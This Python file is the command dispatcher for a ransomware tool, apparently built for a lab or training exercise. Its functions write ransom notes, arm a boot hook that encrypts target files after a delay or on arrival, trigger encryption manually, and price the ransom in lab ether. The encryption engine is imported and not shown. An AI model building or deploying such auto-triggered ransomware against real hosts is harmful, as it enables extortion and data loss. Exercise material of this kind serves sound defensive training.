"""yom-ransomware: the ransomware's commands on a victim host.

    arm        boot hook: drop the note, then act on the trigger setting
    detonate   encrypt the targets now (the manual trigger)
    menu       the participant workspace (terminal UI)
    decrypt    the manual decryptor
    headless   scripted pay-and-recover victim (tests)
    status     one-line state (or --json)
"""

import argparse
import json
import sys
import time

from software.core import payload, settings
from software.ransomware.runtime.engine import PIECE, Ransomware


def _price_and_chain():
    if settings.exists("ransom_payment"):
        cfg = settings.load("ransom_payment")
        from software.ransom_payment.runtime.wallet import format_ether
        return f"{format_ether(cfg['ransom_wei'])} lab ETH", cfg["chain_id"]
    return "", ""


def arm(rw: Ransomware):
    missing = payload.check_needs(rw.cfg.get("needs", []))
    if missing:
        rw.emit("needs_missing", missing=missing)
        print(f"ransomware: cannot run here, missing {missing}", file=sys.stderr)
        return 1
    rw.write_notes(*_price_and_chain())
    trigger = rw.cfg.get("trigger", {"mode": "manual"})
    rw.emit("armed", trigger=trigger["mode"])
    if trigger["mode"] == "delay":
        time.sleep(float(trigger.get("seconds", 0)))
    if trigger["mode"] in ("delay", "on_arrival"):
        detonate(rw)
    return 0


def detonate(rw: Ransomware):
    rw.write_notes(*_price_and_chain())
    record = rw.detonate()
    print(f"{rw.family}: {len(record['files'])} files encrypted on {rw.participant_id} "
          f"({rw.suffix})")
    return 0


def status(rw: Ransomware, as_json: bool):
    info = {"host": rw.participant_id, "family": rw.family, "state": rw.state(),
            "envelopes": len(rw.rules.envelopes())}
    print(json.dumps(info, sort_keys=True) if as_json else
          f"{info['host']}: {info['state']} ({info['envelopes']} envelopes)")
    return 0


def main(argv=None):
    parser = argparse.ArgumentParser(prog="yom-ransomware", description=__doc__,
                                     formatter_class=argparse.RawDescriptionHelpFormatter)
    parser.add_argument("command", choices=["arm", "detonate", "menu", "decrypt",
                                            "headless", "status"])
    parser.add_argument("--json", action="store_true")
    args, rest = parser.parse_known_args(argv)
    if args.command == "decrypt":
        from software.ransomware.runtime import decryptor
        return decryptor.main(rest)
    if args.command == "headless":
        from software.ransomware.runtime import headless
        return headless.main(rest)
    rw = Ransomware()
    if args.command == "arm":
        return arm(rw)
    if args.command == "detonate":
        return detonate(rw)
    if args.command == "menu":
        from software.ransomware.runtime.ui.menu import run_interface
        run_interface(rw)
        return 0
    return status(rw, args.json)


if __name__ == "__main__":
    sys.exit(main())
